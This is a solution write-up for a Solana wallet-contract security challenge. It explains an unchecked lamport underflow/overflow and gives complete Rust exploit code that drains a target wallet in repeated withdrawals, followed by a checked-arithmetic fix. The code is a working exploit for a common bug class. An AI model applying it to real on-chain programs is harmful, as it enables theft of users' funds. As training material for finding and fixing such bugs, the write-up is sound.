# Solution - Overflow/Underflow

The vulnerability in this contract is an overflow/underflow in the deposit function:

```rs
    **wallet_info.lamports.borrow_mut() -= amount;
    **destination_info.lamports.borrow_mut() += amount;
```

Remember that lamports are fractions of SOL. For a large `amount` the `u64` lamports overflow/underflow. If an attacker sets `wallet_info` to the hacker's wallet and `destination_info` to the rich-boi-wallet, they can underflow the `wallet_info` and therefore increase his lamports. Alternatively, they can overflow the `destination_info` and therefore decrease the destination lamports. 
See [here](https://play.rust-lang.org/?version=stable&mode=release&edition=2021&gist=c446a40de01a3af7957817ebe199237a).

There is one more trick to it, as there is a rent check: 
```rs
    let min_balance = rent.minimum_balance(WALLET_LEN as usize);
    if min_balance + amount > **wallet_info.lamports.borrow_mut() {
        return Err(ProgramError::InsufficientFunds);
    }
```
But this only limits the maximum amount stolen per iteration to min_balance lamports.


Here is the example exploit code that Thomas, one of our colleagues, wrote:

```rust
use borsh::BorshSerialize;
use level2::{WalletInstruction, get_wallet_address};
use solana_program::instruction::{AccountMeta, Instruction};
use solana_program::rent::Rent;
use solana_program::sysvar;



fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
    // create hackers wallet
    assert_tx_success(env.execute_as_transaction(
        &[level2::initialize(
            challenge.wallet_program,
            challenge.hacker.pubkey(),
        )],
        &[&challenge.hacker],
    ));

    let hacker_wallet = get_wallet_address(challenge.hacker.pubkey(), challenge.wallet_program);

    let to_transfer = Rent::default().minimum_balance(8);
    println!("To transfer: {}", to_transfer);
    //let to_transfer = 1_000_000u64;
    let overflow = (-(to_transfer as i64)) as u64;

    let iters = 10;

    for i in 0..iters {
        let tx = env.execute_as_transaction(
            &[Instruction {
                program_id: challenge.wallet_program,
                accounts: vec![
                    AccountMeta::new(hacker_wallet, false),              // source wallet
                    AccountMeta::new(challenge.hacker.pubkey(), true),   // owner
                    AccountMeta::new(challenge.wallet_address, false),   // target wallet
                    AccountMeta::new_readonly(sysvar::rent::id(), false), // rent
                ],
                data: WalletInstruction::Withdraw { amount: overflow+i }.try_to_vec().unwrap(),
            }],
            &[&challenge.hacker],
        );
        tx.print_named(&format!("haxx {}", i));
    }
    

    let tx = env.execute_as_transaction(
        &[Instruction {
            program_id: challenge.wallet_program,
            accounts: vec![
                AccountMeta::new(hacker_wallet, false),              // source wallet
                AccountMeta::new(challenge.hacker.pubkey(), true),   // owner
                AccountMeta::new(challenge.hacker.pubkey(), false),  // target wallet
                AccountMeta::new_readonly(sysvar::rent::id(), false), // rent
            ],
            data: WalletInstruction::Withdraw { amount: to_transfer*iters-1000 }.try_to_vec().unwrap(),
        }],
        &[&challenge.hacker],
    );
    tx.print_named("hacker withdraw");
}
```

# Mitigation

By replacing the math with checked math in the `withdraw` function, this vulnerability can be prevented:

```rust
{
    let mut wallet_info_lapmorts = wallet_info.lamports.borrow_mut();
    **wallet_info_lapmorts = (**wallet_info_lapmorts).checked_sub(amount).unwrap();
}

{
    let mut destination_info_lapmorts = destination_info.lamports.borrow_mut();
    **destination_info_lapmorts = (**destination_info_lapmorts).checked_add(amount).unwrap();
}
```